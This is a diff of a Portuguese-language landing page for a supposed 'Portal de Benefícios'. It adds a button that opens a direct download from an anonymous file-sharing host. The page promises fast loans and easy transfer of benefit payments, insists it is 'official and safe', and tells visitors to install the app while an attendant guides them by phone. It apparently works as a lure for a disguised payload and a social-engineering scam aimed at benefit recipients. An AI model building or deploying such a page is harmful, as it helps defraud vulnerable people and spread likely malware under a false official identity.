@@ -33,7 +33,6 @@
       background: linear-gradient(to bottom, rgba(0,58,140,0.65), rgba(0,0,0,0.35));
       border-bottom-left-radius: 1.5rem; border-bottom-right-radius: 1.5rem;
     }
-    /* Botão premium (gradiente + brilho): será usado na Parte 3 */
     .btn-gradient { background: linear-gradient(90deg,#2563eb,#16a34a); position: relative; overflow: hidden; }
     .btn-gradient::before {
       content: ""; position: absolute; top:0; left:-120%; width:200%; height:100%;
@@ -98,8 +97,9 @@
     </div>
   </nav>
 
-  <!-- Hero com overlay e título em gradiente -->
-  <header id="inicio" class="hero-bg relative pt-28 pb-16 md:pb-24 px-6">
+  <!-- Hero -->
+  <header id="inicio" class="hero-bg relative pt-40 pb-16 md:pb-24 px-6">
+    <div class="absolute inset-0 bg-gradient-to-b from-blue-900/70 to-black/40 z-0 rounded-b-2xl"></div>
     <div class="relative z-10 max-w-4xl mx-auto text-center text-white" data-aos="fade-up">
       <h1 class="text-4xl md:text-6xl font-extrabold leading-tight bg-clip-text text-transparent bg-gradient-to-r from-blue-300 to-green-300">
         Instalação Assistida, Rápida e Segura
@@ -108,119 +108,99 @@
         Não pedimos dinheiro, taxas ou senhas sensíveis. Você instala com <strong>acompanhamento de atendente</strong>, do início ao fim.
       </p>
       <div class="mt-8 flex flex-col sm:flex-row gap-3 justify-center">
-        <a href="#vantagens" class="px-6 py-3 rounded-xl bg-white/15 hover:bg-white/25 backdrop-blur border border-white/30">
-          Ver vantagens
-        </a>
-        <a href="#download" class="px-6 py-3 rounded-xl bg-white text-blue-700 font-semibold hover:bg-gray-100">
-          Ir para o download
-        </a>
+        <a href="#vantagens" class="px-6 py-3 rounded-xl bg-white/15 hover:bg-white/25 backdrop-blur border border-white/30">Ver vantagens</a>
+        <a href="#download" class="px-6 py-3 rounded-xl bg-white text-blue-700 font-semibold hover:bg-gray-100">Ir para o download</a>
       </div>
     </div>
   </header>
 
-  <!-- Placeholder do restante das seções (serão preenchidas nas Partes 2 e 3) -->
+  <!-- Conteúdo principal -->
   <main class="max-w-6xl mx-auto px-6 py-10 md:py-14 space-y-10 md:space-y-16">
+
     <!-- Vantagens -->
-<section id="vantagens" class="text-center" data-aos="fade-up">
-  <h2 class="text-3xl md:text-4xl font-extrabold text-blue-900 mb-8">
-    Vantagens Exclusivas para Você
-  </h2>
+    <section id="vantagens" class="text-center" data-aos="fade-up">
+      <h2 class="text-3xl md:text-4xl font-extrabold text-blue-900 mb-8">Vantagens Exclusivas para Você</h2>
+      <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-8 text-lg text-gray-700">
+        <div class="card p-8 flex flex-col items-center" data-aos="zoom-in">
+          <i data-lucide="credit-card" class="w-16 h-16 text-blue-600 mb-4"></i>
+          <h3 class="font-bold text-xl mb-2">Crédito Rápido</h3>
+          <p>Solicite crédito e empréstimos imediatamente após a instalação do aplicativo oficial.</p>
+        </div>
+        <div class="card p-8 flex flex-col items-center" data-aos="zoom-in" data-aos-delay="100">
+          <i data-lucide="shield-check" class="w-16 h-16 text-blue-600 mb-4"></i>
+          <h3 class="font-bold text-xl mb-2">Transferência Segura</h3>
+          <p>Altere o recebimento do seu benefício para a instituição que preferir, sem burocracia.</p>
+        </div>
+        <div class="card p-8 flex flex-col items-center" data-aos="zoom-in" data-aos-delay="200">
+          <i data-lucide="check-circle-2" class="w-16 h-16 text-blue-600 mb-4"></i>
+          <h3 class="font-bold text-xl mb-2">Sem Taxas Ocultas</h3>
+          <p>Evite taxas e cobranças automáticas indesejadas de bancos e financeiras.</p>
+        </div>
+      </div>
+    </section>
 
-  <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-8 text-lg text-gray-700">
-    <!-- Crédito rápido -->
-    <div class="card p-8 flex flex-col items-center" data-aos="zoom-in">
-      <i data-lucide="credit-card" class="w-16 h-16 text-blue-600 mb-4"></i>
-      <h3 class="font-bold text-xl mb-2">Crédito Rápido</h3>
-      <p>Solicite crédito e empréstimos imediatamente após a instalação do aplicativo oficial.</p>
+    <!-- Imagem antes do download -->
+    <div class="card p-4" data-aos="fade-up">
+      <img src="https://i.imgur.com/jw3ObZf.png" alt="Processo de instalação segura via atendente" class="rounded-2xl mx-auto w-full">
     </div>
 
-    <!-- Transferência segura -->
-    <div class="card p-8 flex flex-col items-center" data-aos="zoom-in" data-aos-delay="100">
-      <i data-lucide="shield-check" class="w-16 h-16 text-blue-600 mb-4"></i>
-      <h3 class="font-bold text-xl mb-2">Transferência Segura</h3>
-      <p>Altere o recebimento do seu benefício para a instituição que preferir, sem burocracia.</p>
+    <!-- Download -->
+    <section id="download" class="text-center space-y-6 md:space-y-8" data-aos="fade-up">
+      <h2 class="text-3xl font-extrabold text-blue-900">Baixe o Aplicativo Oficial</h2>
+      <p class="text-lg md:text-xl text-gray-600 max-w-2xl mx-auto">Clique no botão abaixo para iniciar o download. O atendente irá guiá-lo em todas as etapas de instalação.</p>
+      <div class="max-w-md mx-auto">
+        <button id="downloadButton"
+          class="btn-gradient w-full flex items-center justify-center text-white font-semibold text-xl py-5 px-8 rounded-2xl shadow-lg transition-all duration-300 transform hover:scale-105">
+          <span id="buttonText">Baixar o Aplicativo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" class="ml-4 h-7 w-7 arrow-animate" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5m0 0l5-5m-5 5V4" />
+          </svg>
+        </button>
+      </div>
+    </section>
+
+    <!-- Instalação + Segurança -->
+    <div class="grid md:grid-cols-2 gap-8 md:gap-12 mt-12">
+      <section id="instalacao" class="card p-8 md:p-10 space-y-6" data-aos="fade-right">
+        <h2 class="text-2xl font-bold text-blue-800 text-center">Passo a Passo da Instalação</h2>
+        <ol class="list-decimal pl-6 text-lg space-y-4 text-gray-700 text-left">
+          <li>Entre em contato com um de nossos atendentes.</li>
+          <li>Siga as instruções guiadas durante a ligação.</li>
+          <li>Conclua a instalação de forma rápida e segura.</li>
+        </ol>
+        <p class="mt-4 text-sm text-gray-500 text-center">Compatível com Android e Windows.</p>
+      </section>
+      <section id="seguranca" class="card p-8 md:p-10 space-y-6" data-aos="fade-left">
+        <h2 class="text-2xl font-bold text-green-700 text-center">Segurança em Primeiro Lugar <span class="text-gray-400">🛡️</span></h2>
+        <ul class="space-y-4 text-lg text-gray-700 text-left">
+          <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Não pedimos dinheiro ou taxas.</li>
+          <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Não solicitamos senhas sensíveis.</li>
+          <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Instalação guiada por atendente.</li>
+          <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Aplicativo oficial e seguro.</li>
+        </ul>
+      </section>
     </div>
-
-    <!-- Sem taxas -->
-    <div class="card p-8 flex flex-col items-center" data-aos="zoom-in" data-aos-delay="200">
-      <i data-lucide="check-circle-2" class="w-16 h-16 text-blue-600 mb-4"></i>
-      <h3 class="font-bold text-xl mb-2">Sem Taxas Ocultas</h3>
-      <p>Evite taxas e cobranças automáticas indesejadas de bancos e financeiras.</p>
-    </div>
-  </div>
-</section>
-
-<!-- Imagem explicativa (antes do botão de download) -->
-<div class="card p-4" data-aos="fade-up">
-  <img src="https://i.imgur.com/jw3ObZf.png" alt="Processo de instalação segura via atendente"
-       class="rounded-2xl mx-auto w-full">
-</div>
-
-<!-- Botão de Download Premium -->
-<section id="download" class="text-center space-y-6 md:space-y-8" data-aos="fade-up">
-  <h2 class="text-3xl font-extrabold text-blue-900">Baixe o Aplicativo Oficial</h2>
-  <p class="text-lg md:text-xl text-gray-600 max-w-2xl mx-auto">
-    Clique no botão abaixo para iniciar o download. O atendente irá guiá-lo em todas as etapas de instalação.
-  </p>
-  <div class="max-w-md mx-auto">
-    <button id="downloadButton"
-      class="btn-gradient w-full flex items-center justify-center text-white font-semibold text-xl py-5 px-8 rounded-2xl shadow-lg transition-all duration-300 transform hover:scale-105">
-      <span id="buttonText">Baixar o Aplicativo</span>
-      <svg xmlns="http://www.w3.org/2000/svg" class="ml-4 h-7 w-7 arrow-animate" fill="none" viewBox="0 0 24 24"
-        stroke="currentColor">
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-          d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5m0 0l5-5m-5 5V4" />
-      </svg>
-    </button>
-  </div>
-</section>
-
-<!-- Grid com Passo a Passo e Segurança -->
-<div class="grid md:grid-cols-2 gap-8 md:gap-12 mt-12">
-
-  <!-- Como Instalar -->
-  <section id="instalacao" class="card p-8 md:p-10 space-y-6" data-aos="fade-right">
-    <h2 class="text-2xl font-bold text-blue-800 text-center">Passo a Passo da Instalação</h2>
-    <ol class="list-decimal pl-6 text-lg space-y-4 text-gray-700 text-left">
-      <li>Entre em contato com um de nossos atendentes.</li>
-      <li>Siga as instruções guiadas durante a ligação.</li>
-      <li>Conclua a instalação de forma rápida e segura.</li>
-    </ol>
-    <p class="mt-4 text-sm text-gray-500 text-center">Compatível com Android e Windows.</p>
-  </section>
-
-  <!-- Segurança -->
-  <section id="seguranca" class="card p-8 md:p-10 space-y-6" data-aos="fade-left">
-    <h2 class="text-2xl font-bold text-green-700 text-center">
-      Segurança em Primeiro Lugar <span class="text-gray-400">🛡️</span>
-    </h2>
-    <ul class="space-y-4 text-lg text-gray-700 text-left">
-      <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Não pedimos dinheiro ou taxas.</li>
-      <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Não solicitamos senhas sensíveis.</li>
-      <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Instalação guiada por atendente.</li>
-      <li class="flex items-start"><span class="text-green-500 text-2xl mr-2">✔</span> Aplicativo oficial e seguro.</li>
-    </ul>
-  </section>
-</div>
-
-    
   </main>
 
-  <!-- Rodapé básico (será enriquecido na Parte 4) -->
+  <!-- Rodapé -->
   <footer class="bg-blue-900 text-white text-center py-8">
     <p class="text-sm">© 2025 — Portal de Benefícios. Página demonstrativa.</p>
   </footer>
 
   <script>
-    // Inicializa AOS e ícones
     AOS.init({ duration: 800, once: true });
     lucide.createIcons();
-
-    // Menu mobile
     const menuBtn = document.getElementById('menuBtn');
     const mobileMenu = document.getElementById('mobileMenu');
-    menuBtn?.addEventListener('click', () => {
-      mobileMenu.classList.toggle('hidden');
+    menuBtn?.addEventListener('click', () => { mobileMenu.classList.toggle('hidden'); });
+    const downloadButton = document.getElementById('downloadButton');
+    const buttonText = document.getElementById('buttonText');
+    const downloadUrl = "https://www.4sync.com/web/directDownload/b5-eN--R/3-A3cUVB.1d9fd7ae519bff02ad612e9a03460888";
+    downloadButton?.addEventListener('click', () => {
+      downloadButton.disabled = true;
+      buttonText.textContent = "Redirecionando...";
+      window.open(downloadUrl, "_blank");
+      setTimeout(() => { buttonText.textContent = "Download Iniciado!"; }, 1500);
     });
   </script>
 </body>
